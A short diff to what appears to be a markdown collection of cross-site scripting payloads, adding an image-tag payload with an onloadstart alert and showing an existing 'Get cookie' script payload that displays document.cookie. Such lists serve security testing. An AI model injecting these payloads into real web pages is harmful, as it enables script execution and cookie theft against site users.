@@ -1,3 +1,7 @@
+## Non ExistantImage
+```
+<div><image src=validateNonExistantImage.png onloadstart=alert(1337)> hey girl hey </div>
+```
 ## Get cookie
 ```
 nu11secur1ty<script>alert(document.cookie)</script>
